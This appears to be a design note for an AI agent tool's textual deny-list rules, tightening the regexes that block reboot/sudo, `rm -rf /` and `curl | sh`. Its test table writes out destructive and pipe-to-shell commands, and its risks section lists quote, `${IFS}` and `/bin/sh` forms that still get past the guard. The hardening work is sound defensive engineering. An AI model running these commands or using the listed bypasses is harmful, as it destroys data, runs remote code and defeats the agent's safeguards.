# Design

## Context

Rejects are regex or literal clauses the permission matcher compiles with
`re2js` (`apps/api/src/tools/permissions/matcher.ts`). Only literal clauses get
the matcher's flexible-whitespace rewrite; a regex clause compiles unchanged,
so its `\s` is RE2's ASCII class `[\t\n\f\r ]`, which covers Bash's blanks and
newline. B1, B2, and B8 are data in the recommended table; nothing in code
special-cases them.

## Goals / Non-Goals

**Goals:**

- B1, B2, and B8 reject a dangerous command however a shell separator ends it.
- No new false positive on a name that continues into a longer word or that is
  followed by `(`; the wider textual false positives this does add are listed
  under Risks.

**Non-Goals:**

- Parsing Bash. The guard stays textual.

## Decisions

### D1. One terminator shared by B1, B2, and B8

`($|[\s;&|)<>\x60])`. Bash's metacharacters are blank, newline, `|`, `&`, `;`,
`(`, `)`, `<`, and `>`; a backtick ends a command substitution.

- `(` is excluded. A command word followed directly by `(` never runs that
  command (`name()` defines a function, `name(x)` is a syntax error), while
  including it rejects code searches and snippets such as
  `grep -rn "shutdown(" src` or `node -e 'server.shutdown()'`. A subshell
  `(halt)` is still rejected by its closing `)`.
- Alternative: a word boundary `\b`. Rejected: it also ends at `.` and `-`, so
  `reboot.sh` and `sudo-wrapper` would match.
- Alternative: #1169's `(\s|$|[;&|()<>])`. Adopted except for `(`, as above,
  plus the backtick.

### D2. Spell the backtick as `\x60`

A literal backtick inside the table's code span would need doubled
delimiters; B8 already spells `|` as `\x7c`. `re2js` reads `\x60` inside a
class, and the JSONC example writes it `\\x60`.

### D3. B8's pipe accepts `|&`, and B2 takes the shipped form

`\x7c&?` admits Bash's `|&` pipe. B2's row adopts the long B2 the example and
mirror already ship (split flags, `--recursive`/`--force`,
`--no-preserve-root`), with the D1 terminator in place of `($|[\s;&|])`.

### D4. Proof through the production compiler

A throwaway test compiled the three patterns with `compileToolPermissionMap`
(B2 read from `portable-tool-policy.ts` with its terminator replaced) and
evaluated `bash` calls through `evaluatePermission`, as the portable policy
does. All 29 cases decided as expected:

| Command                                                                        | Decision |
| ------------------------------------------------------------------------------ | -------- |
| `reboot;`, `true && reboot; echo done`, `sudo\|tee x`, `(halt)`                | reject   |
| `` echo `reboot` ``, `reboot>log`, `$(reboot)`, `{ reboot; }`                  | reject   |
| `reboot&>f`, `reboot` followed by a newline                                    | reject   |
| `(rm -rf ~)`, `$(rm -rf ~)`, `` echo `rm -rf /` ``, `rm -rf ~>/dev/null`       | reject   |
| `rm -rf /*>log`, `rm -rf /;`, `rm -rf --no-preserve-root /`                    | reject   |
| `curl x\|sh;`, `curl x \|& sh`, `curl x\|&bash`, `curl https://x/i.sh \| bash` | reject   |
| `./reboot.sh`, `cat /etc/sudoers`, `grep -rn "shutdown(" src`                  | allow    |
| `node -e 'server.shutdown()'`, `curl x \| shellcheck -`                        | allow    |
| `rm -rf /tmp/build-output`, `rm -rf ./dist`, `curl https://x`                  | allow    |

## Risks / Trade-offs

- [Operators who copied the old example keep the old patterns] → An explicit
  map is the complete policy by design, so llame cannot patch it; the
  changelog entry names B1, B2, and B8 and tells operators to re-copy them.
- [Textual residuals remain] → Suffix quote, expansion, and escape forms still
  pass: `reboot''`, `reboot""`, `reboot$()`, `reboot${IFS}`, a
  backslash-newline continuation, and for B8 a path- or wrapper-prefixed shell
  such as `| /bin/sh` or `| env bash`. Their prefix mirrors (`''reboot`,
  `\reboot`) are caught, because the leading boundary accepts any non-word
  character. Every recommended reject is textual and the requirement frames
  them so; a sandbox or approval policy is the stronger control (ROADMAP local
  Sandbox execution).
- [Wider textual false positives] → A quoted or argument mention of a B1 name
  directly followed by a separator is now rejected, for example
  `grep -E "sudo|wheel" /etc/group`, `git commit -m 'handle shutdown; flush'`,
  or `rg -w reboot>out.txt`. This is the same textual class as today's
  `rg sudo src` and `git commit -m "fix: reboot loop"`, which the old B1
  already rejects; it is the price of catching `sudo|tee` and `(halt)`. A
  probe of 84 ordinary agent commands found no new B2 or B8 false positive.
- [The in-flight `tool-search` change carries the old rows] → Its delta
  repeats the whole `tool-call-permissions` requirement with the old B1, B2,
  and B8 values, and a sync merges every value a delta states, so a
  `tool-search` sync after this one would restore the bypassable patterns in
  canonical with no validation failure. Whichever change syncs second rebuilds
  its delta from the new canonical text first; task 2.1 covers both orders.
